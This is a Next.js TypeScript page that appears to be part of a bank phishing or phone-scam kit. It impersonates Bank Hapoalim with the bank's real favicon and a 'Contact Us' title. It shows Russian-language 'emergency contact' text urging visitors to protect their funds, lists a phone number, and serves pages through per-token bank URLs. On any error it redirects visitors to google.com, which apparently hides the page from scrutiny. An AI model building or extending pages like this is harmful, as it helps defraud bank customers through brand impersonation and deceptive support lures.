import LandingPage from "@/app/[locale]/[bank]/[token]/LandingPage";
import { LandingDto } from "@myorg/shared/dto";
import type { Metadata } from "next";
import { redirect } from "next/navigation";

type Params = {
    params: Promise<{ locale: string; bank: string; token: string }>;
};

export async function generateMetadata({ params }: Params): Promise<Metadata> {
    const { bank, token } = await params;

    let data;
    try {
        const body = await getData(bank);
        data = body.data;
    } catch (error) {}

    return {
        title: data?.meta.title,
        icons: {
            icon: data?.meta.icon,
        },
    };
}

export default async function Page({ params }: Params) {
    const { token, bank } = await params;

    let data;
    try {
        const body = await getData(bank);
        data = body.data;
    } catch (error) {
        return redirect("https://www.google.com/");
    }

    return <LandingPage landing={data} />;
}

async function getData(bank: string): Promise<{ data: LandingDto }> {
    return {
        data: {
            meta: {
                icon: {
                    size: 323,
                    url: "https://www.bankhapoalim.com/sites/all/themes/poalim/favicon.ico",
                    id: "adsdadasdfa",
                    mimeType: "jpg",
                    width: 342,
                    height: 234,
                    createdAt: "dasd",
                },
                title: "Contact Us - Bank Hapoalim",
            },
            title: "Экстренная связь",
            subtitle:
                "Наша служба поддержки доступна 24/7 и готова оперативно помочь вам защитить ваши средства и данные.",
            background: {
                size: 323,
                url: "/bg.jpg",
                id: "adsd23adasdfa",
                mimeType: "jpg",
                width: 342,
                height: 234,
                createdAt: "dasd",
            },
            phone: "+4243042342",
            logo: {
                size: 323,
                url: "/logo.png",
                id: "adsd23adasdfa",
                mimeType: "jpg",
                width: 342,
                height: 234,
                createdAt: "dasd",
            },
            color: "red",
        },
    };
}
